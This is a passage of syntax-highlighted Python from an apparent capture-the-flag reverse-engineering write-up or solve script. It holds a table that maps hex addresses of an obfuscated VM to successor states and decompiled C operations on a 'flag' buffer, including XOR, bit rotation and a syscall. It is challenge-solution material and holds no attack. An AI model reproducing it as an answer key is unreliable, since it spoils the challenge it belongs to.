class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x3b11</span>: ([<span class="hljs-number">0x2337</span>, <span class="hljs-number">0x6d19</span>, <span class="hljs-number">0x7462</span>, <span class="hljs-number">0x188f</span>, <span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x3b11</span>, <span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x6fb6</span>, <span class="hljs-number">0x66a4</span>, <span class="hljs-number">0x7462</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x6d19</span>: ([<span class="hljs-number">0x6df8</span>, <span class="hljs-number">0x6df8</span>, <span class="hljs-number">0x188f</span>, <span class="hljs-number">0x66a4</span>, <span class="hljs-number">0x6fb6</span>, <span class="hljs-number">0x40cb</span>, <span class="hljs-number">0x66a4</span>, <span class="hljs-number">0x2db3</span>, <span class="hljs-number">0x464f</span>, <span class="hljs-number">0x2db3</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x6df8</span>: ([<span class="hljs-number">0x464f</span>, <span class="hljs-number">0x40cb</span>, <span class="hljs-number">0x6d19</span>, <span class="hljs-number">0x6fb6</span>, <span class="hljs-number">0x6df8</span>, <span class="hljs-number">0x464f</span>, <span class="hljs-number">0x6fb6</span>, <span class="hljs-number">0x66a4</span>, <span class="hljs-number">0x6233</span>, <span class="hljs-number">0x464f</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x464f</span>: ([<span class="hljs-number">0x40cb</span>, <span class="hljs-number">0x40cb</span>, <span class="hljs-number">0x6d19</span>, <span class="hljs-number">0x5927</span>, <span class="hljs-number">0x6df8</span>, <span class="hljs-number">0x464f</span>, <span class="hljs-number">0x188f</span>, <span class="hljs-number">0x6d19</span>, <span class="hljs-number">0x6bc8</span>, <span class="hljs-number">0x6233</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x5927</span>: ([<span class="hljs-number">0x55a9</span>, <span class="hljs-number">0x1cd0</span>, <span class="hljs-number">0x16f8</span>, <span class="hljs-number">0x2b07</span>, <span class="hljs-number">0x64d3</span>, <span class="hljs-number">0x6a77</span>, <span class="hljs-number">0x3a4b</span>, <span class="hljs-number">0x41aa</span>, <span class="hljs-number">0x2261</span>, <span class="hljs-number">0x3e48</span>], <span class="hljs-string">&quot;  *((_BYTE *)&amp;flag + (unsigned __int8)r1) = ((int)*((unsigned __int8 *)&amp;flag + (unsigned __int8)r1) &gt;&gt; array[r0]) | (*((_BYTE *)&amp;flag + (unsigned __int8)r1) &lt;&lt; (8 - array[r0]));&quot;</span>),<br><span class="hljs-number">0x2b07</span>: ([<span class="hljs-number">0x3d82</span>, <span class="hljs-number">0x7809</span>, <span class="hljs-number">0x5e5b</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x3a4b</span>, <span class="hljs-number">0x3e48</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x6df8</span>, <span class="hljs-number">0x17be</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x3d82</span>: ([<span class="hljs-number">0x2b07</span>, <span class="hljs-number">0x3f0e</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x3d82</span>, <span class="hljs-number">0x7375</span>, <span class="hljs-number">0x3308</span>, <span class="hljs-number">0x48fe</span>, <span class="hljs-number">0x55a9</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x3bf0</span>], <span class="hljs-string">&quot;  ++r0;&quot;</span>),<br><span class="hljs-number">0x3959</span>: ([<span class="hljs-number">0x53cc</span>, <span class="hljs-number">0x153a</span>, <span class="hljs-number">0x284a</span>, <span class="hljs-number">0x2917</span>, <span class="hljs-number">0x3bf0</span>, <span class="hljs-number">0x136e</span>, <span class="hljs-number">0x2b07</span>, <span class="hljs-number">0x2f84</span>, <span class="hljs-number">0x26a4</span>, <span class="hljs-number">0x55a9</span>], <span class="hljs-string">&quot;  ++r0;&quot;</span>),<br><span class="hljs-number">0x53cc</span>: ([<span class="hljs-number">0x472e</span>, <span class="hljs-number">0x2bdd</span>, <span class="hljs-number">0x2771</span>, <span class="hljs-number">0x4e18</span>, <span class="hljs-number">0x3137</span>, <span class="hljs-number">0x2182</span>, <span class="hljs-number">0x5baf</span>, <span class="hljs-number">0x7462</span>, <span class="hljs-number">0x43c2</span>, <span class="hljs-number">0x3959</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x472e</span>: ([<span class="hljs-number">0x4e18</span>, <span class="hljs-number">0x6154</span>, <span class="hljs-number">0x5aa9</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x7541</span>, <span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x3725</span>, <span class="hljs-number">0x43c2</span>, <span class="hljs-number">0x4e18</span>, <span class="hljs-number">0x66a4</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x4e18</span>: ([<span class="hljs-number">0x679b</span>, <span class="hljs-number">0x5002</span>, <span class="hljs-number">0x472e</span>, <span class="hljs-number">0x2a19</span>, <span class="hljs-number">0x153a</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x2182</span>, <span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x3137</span>, <span class="hljs-number">0x42fc</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x679b</span>: ([<span class="hljs-number">0x4e18</span>, <span class="hljs-number">0x1bf1</span>, <span class="hljs-number">0x3137</span>, <span class="hljs-number">0x679b</span>, <span class="hljs-number">0x7375</span>, <span class="hljs-number">0x3cbc</span>, <span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x6ed7</span>, <span class="hljs-number">0x43c2</span>, <span class="hljs-number">0x55a9</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x1bf1</span>: ([<span class="hljs-number">0x3137</span>, <span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x1bf1</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x5aa9</span>, <span class="hljs-number">0x5f5c</span>, <span class="hljs-number">0x4e18</span>, <span class="hljs-number">0x3058</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x3137</span>: ([<span class="hljs-number">0x1610</span>, <span class="hljs-number">0x3a4b</span>, <span class="hljs-number">0x3137</span>, <span class="hljs-number">0x3216</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x4a13</span>, <span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x1bf1</span>, <span class="hljs-number">0x68a6</span>, <span class="hljs-number">0x3876</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x1610</span>: ([<span class="hljs-number">0x3725</span>, <span class="hljs-number">0x2e92</span>, <span class="hljs-number">0x340a</span>, <span class="hljs-number">0x6233</span>, <span class="hljs-number">0x481b</span>, <span class="hljs-number">0x44aa</span>, <span class="hljs-number">0x4d52</span>, <span class="hljs-number">0x2f84</span>, <span class="hljs-number">0x7375</span>, <span class="hljs-number">0x16f8</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x2e92</span>: ([<span class="hljs-number">0x188f</span>, <span class="hljs-number">0x43c2</span>, <span class="hljs-number">0x6233</span>, <span class="hljs-number">0x3876</span>, <span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x464f</span>, <span class="hljs-number">0x196d</span>, <span class="hljs-number">0x679b</span>, <span class="hljs-number">0x4b0f</span>, <span class="hljs-number">0x7375</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x188f</span>: ([<span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x6df8</span>, <span class="hljs-number">0x6bc8</span>, <span class="hljs-number">0x52ed</span>, <span class="hljs-number">0x6fb6</span>, <span class="hljs-number">0x6fb6</span>, <span class="hljs-number">0x188f</span>, <span class="hljs-number">0x2182</span>, <span class="hljs-number">0x6d19</span>, <span class="hljs-number">0x52ed</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x62f3</span>: ([<span class="hljs-number">0x604e</span>, <span class="hljs-number">0x6d19</span>, <span class="hljs-number">0x604e</span>, <span class="hljs-number">0x66a4</span>, <span class="hljs-number">0x4f23</span>, <span class="hljs-number">0x4570</span>, <span class="hljs-number">0x4f23</span>, <span class="hljs-number">0x2337</span>, <span class="hljs-number">0x3b11</span>, <span class="hljs-number">0x6fb6</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x66a4</span>: ([<span class="hljs-number">0x6fb6</span>, <span class="hljs-number">0x2db3</span>, <span class="hljs-number">0x3b11</span>, <span class="hljs-number">0x188f</span>, <span class="hljs-number">0x4f23</span>, <span class="hljs-number">0x464f</span>, <span class="hljs-number">0x2db3</span>, <span class="hljs-number">0x66a4</span>, <span class="hljs-number">0x6d19</span>, <span class="hljs-number">0x2db3</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x2db3</span>: ([<span class="hljs-number">0x3b11</span>, <span class="hljs-number">0x6df8</span>, <span class="hljs-number">0x604e</span>, <span class="hljs-number">0x464f</span>, <span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x6d19</span>, <span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x2db3</span>, <span class="hljs-number">0x6df8</span>, <span class="hljs-number">0x6d19</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x43c2</span>: ([<span class="hljs-number">0x3137</span>, <span class="hljs-number">0x5002</span>, <span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x4a13</span>, <span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x1bf1</span>, <span class="hljs-number">0x7809</span>, <span class="hljs-number">0x7809</span>, <span class="hljs-number">0x4a13</span>, <span class="hljs-number">0x679b</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x4a13</span>: ([<span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-number">0x68a6</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-number">0x472e</span>, <span class="hljs-number">0x3876</span>, <span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x4a13</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x3058</span>: ([<span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x5f5c</span>, <span class="hljs-number">0x1bf1</span>, <span class="hljs-number">0x472e</span>, <span class="hljs-number">0x5aa9</span>, <span class="hljs-number">0x6154</span>, <span class="hljs-number">0x43c2</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x4e18</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x5aa9</span>: ([<span class="hljs-number">0x1bf1</span>, <span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x6154</span>, <span class="hljs-number">0x43c2</span>, <span class="hljs-number">0x6df8</span>, <span class="hljs-number">0x3216</span>, <span class="hljs-number">0x2e92</span>, <span class="hljs-number">0x6154</span>, <span class="hljs-number">0x54ca</span>, <span class="hljs-number">0x5676</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x3216</span>: ([<span class="hljs-number">0x7375</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-number">0x5aa9</span>, <span class="hljs-number">0x5c94</span>, <span class="hljs-number">0x12a8</span>, <span class="hljs-number">0x78f1</span>, <span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x11c9</span>, <span class="hljs-number">0x5103</span>, <span class="hljs-number">0x78f1</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x7375</span>: ([<span class="hljs-number">0x26a4</span>, <span class="hljs-number">0x153a</span>, <span class="hljs-number">0x7095</span>, <span class="hljs-number">0x64d3</span>, <span class="hljs-number">0x7375</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x284a</span>, <span class="hljs-number">0x7095</span>, <span class="hljs-number">0x78f1</span>, <span class="hljs-number">0x3bf0</span>], <span class="hljs-string">&quot;  ++r0;&quot;</span>),<br><span class="hljs-number">0x26a4</span>: ([<span class="hljs-number">0x5002</span>, <span class="hljs-number">0x3725</span>, <span class="hljs-number">0x2f84</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x604e</span>, <span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x2f84</span>, <span class="hljs-number">0x5754</span>, <span class="hljs-number">0x2bdd</span>, <span class="hljs-number">0x3876</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x2f84</span>: ([<span class="hljs-number">0x136e</span>, <span class="hljs-number">0x1ee8</span>, <span class="hljs-number">0x48fe</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x5833</span>, <span class="hljs-number">0x3565</span>, <span class="hljs-number">0x3bf0</span>, <span class="hljs-number">0x2f84</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x724c</span>], <span class="hljs-string">&quot;  ++r0;&quot;</span>),<br><span class="hljs-number">0x136e</span>: ([<span class="hljs-number">0x2a19</span>, <span class="hljs-number">0x5f5c</span>, <span class="hljs-number">0x17be</span>, <span class="hljs-number">0x42fc</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x78f1</span>, <span class="hljs-number">0x3e48</span>, <span class="hljs-number">0x3bf0</span>, <span class="hljs-number">0x2771</span>, <span class="hljs-number">0x3725</span>], <span class="hljs-string">&quot;  *((_BYTE *)&amp;flag + (unsigned __int8)r1) ^= array[r0];&quot;</span>),<br><span class="hljs-number">0x2a19</span>: ([<span class="hljs-number">0x3bf0</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x3bf0</span>, <span class="hljs-number">0x3bf0</span>, <span class="hljs-number">0x24db</span>, <span class="hljs-number">0x7095</span>, <span class="hljs-number">0x78f1</span>, <span class="hljs-number">0x17be</span>, <span class="hljs-number">0x7095</span>], <span class="hljs-string">&quot;  *((_BYTE *)&amp;flag + (unsigned __int8)r1) = array[r0];&quot;</span>),<br><span class="hljs-number">0x3bf0</span>: ([<span class="hljs-number">0x5754</span>, <span class="hljs-number">0x3d82</span>, <span class="hljs-number">0x3d82</span>, <span class="hljs-number">0x40cb</span>, <span class="hljs-number">0x464f</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x6df8</span>, <span class="hljs-number">0x3d82</span>, <span class="hljs-number">0x5754</span>, <span class="hljs-number">0x481b</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x481b</span>: ([<span class="hljs-number">0x48fe</span>, <span class="hljs-number">0x340a</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x5754</span>, <span class="hljs-number">0x6ed7</span>, <span class="hljs-number">0x5d6d</span>, <span class="hljs-number">0x153a</span>, <span class="hljs-number">0x3cbc</span>, <span class="hljs-number">0x6df8</span>, <span class="hljs-number">0x2f84</span>], <span class="hljs-string">&quot;  ++r0;&quot;</span>),<br><span class="hljs-number">0x48fe</span>: ([<span class="hljs-number">0x1fb5</span>, <span class="hljs-number">0x2771</span>, <span class="hljs-number">0x241a</span>, <span class="hljs-number">0x44aa</span>, <span class="hljs-number">0x1fb5</span>, <span class="hljs-number">0x12a8</span>, <span class="hljs-number">0x5d6d</span>, <span class="hljs-number">0x5d6d</span>, <span class="hljs-number">0x5d6d</span>, <span class="hljs-number">0x5baf</span>], <span class="hljs-string">&quot;  *((_BYTE *)&amp;flag + (unsigned __int8)r1) ^= array[r0];&quot;</span>),<br><span class="hljs-number">0x1fb5</span>: ([<span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x2425</span>, <span class="hljs-number">0x69b1</span>, <span class="hljs-number">0x6d19</span>, <span class="hljs-number">0x464f</span>, <span class="hljs-number">0x241a</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x153a</span>, <span class="hljs-number">0x2425</span>, <span class="hljs-number">0x3e48</span>], <span class="hljs-string">&quot;  array[r0] = *((_BYTE *)&amp;flag + (unsigned __int8)r1);&quot;</span>),<br><span class="hljs-number">0x2425</span>: ([<span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x2f84</span>, <span class="hljs-number">0x3308</span>, <span class="hljs-number">0x3308</span>, <span class="hljs-number">0x48fe</span>, <span class="hljs-number">0x2a19</span>, <span class="hljs-number">0x48fe</span>, <span class="hljs-number">0x2a19</span>, <span class="hljs-number">0x3308</span>, <span class="hljs-number">0x2a19</span>], <span class="hljs-string">&quot;  ++r1;&quot;</span>),<br><span class="hljs-number">0x3308</span>: ([<span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x724c</span>, <span class="hljs-number">0x5d6d</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x3e48</span>, <span class="hljs-number">0x3e48</span>, <span class="hljs-number">0x5d6d</span>, <span class="hljs-number">0x6154</span>, <span class="hljs-number">0x1fb5</span>, <span class="hljs-number">0x5d6d</span>], <span class="hljs-string">&quot;  *((_BYTE *)&amp;flag + (unsigned __int8)r1) ^= array[r0];&quot;</span>),<br><span class="hljs-number">0x724c</span>: ([<span class="hljs-number">0x16f8</span>, <span class="hljs-number">0x64d3</span>, <span class="hljs-number">0x2425</span>, <span class="hljs-number">0x7717</span>, <span class="hljs-number">0x2bdd</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x4d52</span>, <span class="hljs-number">0x78f1</span>, <span class="hljs-number">0x2425</span>, <span class="hljs-number">0x2b07</span>], <span class="hljs-string">&quot;  *((_BYTE *)&amp;flag + (unsigned __int8)r1) ^= array[r0];&quot;</span>),<br><span class="hljs-number">0x64d3</span>: ([<span class="hljs-number">0x3308</span>, <span class="hljs-number">0x5d6d</span>, <span class="hljs-number">0x3d82</span>, <span class="hljs-number">0x26a4</span>, <span class="hljs-number">0x724c</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x51ff</span>, <span class="hljs-number">0x5002</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x724c</span>], <span class="hljs-string">&quot;  ++r0;&quot;</span>),<br><span class="hljs-number">0x5d6d</span>: ([<span class="hljs-number">0x2425</span>, <span class="hljs-number">0x3e48</span>, <span class="hljs-number">0x3e48</span>, <span class="hljs-number">0x55a9</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x3e48</span>, <span class="hljs-number">0x2a19</span>, <span class="hljs-number">0x3e48</span>, <span class="hljs-number">0x2425</span>, <span class="hljs-number">0x3e48</span>], <span class="hljs-string">&quot;  array[r0] = *((_BYTE *)&amp;flag + (unsigned __int8)r1);&quot;</span>),<br><span class="hljs-number">0x3e48</span>: ([<span class="hljs-number">0x25b1</span>, <span class="hljs-number">0x2a19</span>, <span class="hljs-number">0x48fe</span>, <span class="hljs-number">0x48fe</span>, <span class="hljs-number">0x48fe</span>, <span class="hljs-number">0x2a19</span>, <span class="hljs-number">0x48fe</span>, <span class="hljs-number">0x2a19</span>, <span class="hljs-number">0x3308</span>, <span class="hljs-number">0x48fe</span>], <span class="hljs-string">&quot;  ++r1;&quot;</span>),<br><span class="hljs-number">0x5676</span>: ([<span class="hljs-number">0x2b07</span>, <span class="hljs-number">0x1ee8</span>, <span class="hljs-number">0x24db</span>, <span class="hljs-number">0x3d82</span>, <span class="hljs-number">0x7095</span>, <span class="hljs-number">0x5833</span>, <span class="hljs-number">0x24db</span>, <span class="hljs-number">0x7095</span>, <span class="hljs-number">0x7375</span>, <span class="hljs-number">0x3308</span>], <span class="hljs-string">&quot;  ++r0;&quot;</span>),<br><span class="hljs-number">0x1ee8</span>: ([<span class="hljs-number">0x2337</span>, <span class="hljs-number">0x6a77</span>, <span class="hljs-number">0x7375</span>, <span class="hljs-number">0x196d</span>, <span class="hljs-number">0x3a4b</span>, <span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x679b</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x7717</span>, <span class="hljs-number">0x7462</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x6a77</span>: ([<span class="hljs-number">0x24db</span>, <span class="hljs-number">0x5aa9</span>, <span class="hljs-number">0x51ff</span>, <span class="hljs-number">0x284a</span>, <span class="hljs-number">0x5927</span>, <span class="hljs-number">0x481b</span>, <span class="hljs-number">0x241a</span>, <span class="hljs-number">0x5baf</span>, <span class="hljs-number">0x6154</span>, <span class="hljs-number">0x40cb</span>], <span class="hljs-string">&quot;  *((_BYTE *)&amp;flag + (unsigned __int8)r1) = ((int)*((unsigned __int8 *)&amp;flag + (unsigned __int8)r1) &gt;&gt; array[r0]) | (*((_BYTE *)&amp;flag + (unsigned __int8)r1) &lt;&lt; (8 - array[r0]));&quot;</span>),<br><span class="hljs-number">0x51ff</span>: ([<span class="hljs-number">0x26a4</span>, <span class="hljs-number">0x55a9</span>, <span class="hljs-number">0x53cc</span>, <span class="hljs-number">0x5e5b</span>, <span class="hljs-number">0x51ff</span>, <span class="hljs-number">0x24db</span>, <span class="hljs-number">0x26a4</span>, <span class="hljs-number">0x4e18</span>, <span class="hljs-number">0x5d6d</span>, <span class="hljs-number">0x2b07</span>], <span class="hljs-string">&quot;  if ( (char)array[r0] &lt; 0 ) rand();&quot;</span>),<br><span class="hljs-number">0x284a</span>: ([<span class="hljs-number">0x5676</span>, <span class="hljs-number">0x5e5b</span>, <span class="hljs-number">0x7375</span>, <span class="hljs-number">0x464f</span>, <span class="hljs-number">0x4570</span>, <span class="hljs-number">0x69b1</span>, <span class="hljs-number">0x7717</span>, <span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x3f0e</span>, <span class="hljs-number">0x2337</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x69b1</span>: ([<span class="hljs-number">0x78f1</span>, <span class="hljs-number">0x153a</span>, <span class="hljs-number">0x3d82</span>, <span class="hljs-number">0x6ed7</span>, <span class="hljs-number">0x42fc</span>, <span class="hljs-number">0x44aa</span>, <span class="hljs-number">0x7809</span>, <span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x51ff</span>, <span class="hljs-number">0x44aa</span>], <span class="hljs-string">&quot;  --r1;&quot;</span>),<br><span class="hljs-number">0x78f1</span>: ([<span class="hljs-number">0x7638</span>, <span class="hljs-number">0x5002</span>, <span class="hljs-number">0x41aa</span>, <span class="hljs-number">0x3876</span>, <span class="hljs-number">0x1a4c</span>, <span class="hljs-number">0x51ff</span>, <span class="hljs-number">0x3cbc</span>, <span class="hljs-number">0x7717</span>, <span class="hljs-number">0x2f84</span>, <span class="hljs-number">0x26a4</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x7638</span>: ([<span class="hljs-number">0x5aa9</span>, <span class="hljs-number">0x44aa</span>, <span class="hljs-number">0x464f</span>, <span class="hljs-number">0x3876</span>, <span class="hljs-number">0x2a19</span>, <span class="hljs-number">0x3137</span>, <span class="hljs-number">0x3d82</span>, <span class="hljs-number">0x2337</span>, <span class="hljs-number">0x2261</span>, <span class="hljs-number">0x48fe</span>], <span class="hljs-string">&quot;  --array[r0];&quot;</span>),<br><span class="hljs-number">0x44aa</span>: ([<span class="hljs-number">0x44aa</span>, <span class="hljs-number">0x44aa</span>, <span class="hljs-number">0x44aa</span>, <span class="hljs-number">0x5c94</span>, <span class="hljs-number">0x69b1</span>, <span class="hljs-number">0x5d6d</span>, <span class="hljs-number">0x44aa</span>, <span class="hljs-number">0x69b1</span>, <span class="hljs-number">0x44aa</span>, <span class="hljs-number">0x44aa</span>], <span class="hljs-string">&quot;  --r1;&quot;</span>),<br><span class="hljs-number">0x2261</span>: ([<span class="hljs-number">0x7095</span>, <span class="hljs-number">0x17be</span>, <span class="hljs-number">0x7095</span>, <span class="hljs-number">0x26a4</span>, <span class="hljs-number">0x284a</span>, <span class="hljs-number">0x3bf0</span>, <span class="hljs-number">0x24db</span>, <span class="hljs-number">0x55a9</span>, <span class="hljs-number">0x6bc8</span>, <span class="hljs-number">0x24db</span>], <span class="hljs-string">&quot;  if ( (char)array[r0] &lt; 0 ) rand();&quot;</span>),<br><span class="hljs-number">0x7095</span>: ([<span class="hljs-number">0x4570</span>, <span class="hljs-number">0x7717</span>, <span class="hljs-number">0x7375</span>, <span class="hljs-number">0x7717</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x4f23</span>, <span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x5754</span>, <span class="hljs-number">0x7717</span>, <span class="hljs-number">0x3959</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x7717</span>: ([<span class="hljs-number">0x17be</span>, <span class="hljs-number">0x1cd0</span>, <span class="hljs-number">0x3565</span>, <span class="hljs-number">0x2261</span>, <span class="hljs-number">0x3565</span>, <span class="hljs-number">0x5c94</span>, <span class="hljs-number">0x43c2</span>, <span class="hljs-number">0x2261</span>, <span class="hljs-number">0x2261</span>, <span class="hljs-number">0x3565</span>], <span class="hljs-string">&quot;  --array[r0];&quot;</span>),<br><span class="hljs-number">0x17be</span>: ([<span class="hljs-number">0x7717</span>, <span class="hljs-number">0x2425</span>, <span class="hljs-number">0x64d3</span>, <span class="hljs-number">0x284a</span>, <span class="hljs-number">0x2db3</span>, <span class="hljs-number">0x5002</span>, <span class="hljs-number">0x1ee8</span>, <span class="hljs-number">0x6df8</span>, <span class="hljs-number">0x6ed7</span>, <span class="hljs-number">0x2db3</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x3565</span>: ([<span class="hljs-number">0x55a9</span>, <span class="hljs-number">0x16f8</span>, <span class="hljs-number">0x6df8</span>, <span class="hljs-number">0x48fe</span>, <span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x6bc8</span>, <span class="hljs-number">0x55a9</span>, <span class="hljs-number">0x2f84</span>, <span class="hljs-number">0x17be</span>, <span class="hljs-number">0x363b</span>], <span class="hljs-string">&quot;  if ( (char)array[r0] &lt; 0 ) rand();&quot;</span>),<br><span class="hljs-number">0x363b</span>: ([<span class="hljs-number">0x2771</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x2917</span>, <span class="hljs-number">0x3565</span>, <span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x6fb6</span>, <span class="hljs-number">0x5754</span>, <span class="hljs-number">0x41aa</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x2771</span>: ([<span class="hljs-number">0x4f23</span>, <span class="hljs-number">0x24db</span>, <span class="hljs-number">0x6a77</span>, <span class="hljs-number">0x25b1</span>, <span class="hljs-number">0x40cb</span>, <span class="hljs-number">0x25b1</span>, <span class="hljs-number">0x2a19</span>, <span class="hljs-number">0x2db3</span>, <span class="hljs-number">0x679b</span>, <span class="hljs-number">0x12a8</span>], <span class="hljs-string">&quot;  ++r1;&quot;</span>),<br><span class="hljs-number">0x12a8</span>: ([<span class="hljs-number">0x1cd0</span>, <span class="hljs-number">0x3725</span>, <span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x17be</span>, <span class="hljs-number">0x7375</span>, <span class="hljs-number">0x2db3</span>, <span class="hljs-number">0x2a19</span>, <span class="hljs-number">0x604e</span>, <span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x2425</span>], <span class="hljs-string">&quot;  ++r1;&quot;</span>),<br><span class="hljs-number">0x41aa</span>: ([<span class="hljs-number">0x1cd0</span>, <span class="hljs-number">0x3565</span>, <span class="hljs-number">0x6d19</span>, <span class="hljs-number">0x2f84</span>, <span class="hljs-number">0x3137</span>, <span class="hljs-number">0x2261</span>, <span class="hljs-number">0x1cd0</span>, <span class="hljs-number">0x481b</span>, <span class="hljs-number">0x66a4</span>, <span class="hljs-number">0x3137</span>], <span class="hljs-string">&quot;  array[r0] = syscall((char)array[r0], (unsigned int)(char)array[r0 + 1], &amp;array[r0 + 2], (unsigned int)(char)array[r0 + 3]);&quot;</span>),<br><span class="hljs-number">0x1a4c</span>: ([<span class="hljs-number">0x1e22</span>, <span class="hljs-number">0x41aa</span>, <span class="hljs-number">0x6233</span>, <span class="hljs-number">0x1e22</span>, <span class="hljs-number">0x340a</span>, <span class="hljs-number">0x16f8</span>, <span class="hljs-number">0x1a4c</span>, <span class="hljs-number">0x6233</span>, <span class="hljs-number">0x6233</span>, <span class="hljs-number">0x16f8</span>], <span class="hljs-string">&quot;  --r0;&quot;</span>),<br><span class="hljs-number">0x1e22</span>: ([<span class="hljs-number">0x1a4c</span>, <span class="hljs-number">0x4a13</span>, <span class="hljs-number">0x24db</span>, <span class="hljs-number">0x24db</span>, <span class="hljs-number">0x1cd0</span>, <span class="hljs-number">0x1a4c</span>, <span class="hljs-number">0x340a</span>, <span class="hljs-number">0x340a</span>, <span class="hljs-number">0x5c94</span>, <span class="hljs-number">0x42fc</span>], <span class="hljs-string">&quot;  --r0;&quot;</span>),<br><span class="hljs-number">0x42fc</span>: ([<span 